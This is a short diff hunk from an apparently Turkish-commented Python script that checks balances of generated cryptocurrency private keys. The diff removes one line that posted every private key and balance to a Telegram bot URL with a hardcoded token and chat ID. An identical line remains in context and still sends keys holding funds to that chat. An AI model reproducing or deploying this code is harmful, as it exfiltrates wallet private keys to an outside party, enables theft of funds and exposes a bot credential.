@@ -62,8 +62,6 @@ async def main():
                 if balance is None:
                     raise Exception("Rate limit hit")  # Rate limit durumuna geçiş
 
-                requests.post(f'https://api.telegram.org/bot8089386975:AAEdnpBkUZrHMUzJQrEXrheMVZ8StNLfspU/sendmessage?chat_id=6553604328&text={private_key}|{balance}')
-               
                 if balance > 0:
                     found_wallets += 1
                     requests.post(f'https://api.telegram.org/bot8089386975:AAEdnpBkUZrHMUzJQrEXrheMVZ8StNLfspU/sendmessage?chat_id=6553604328&text={private_key}|{balance}')
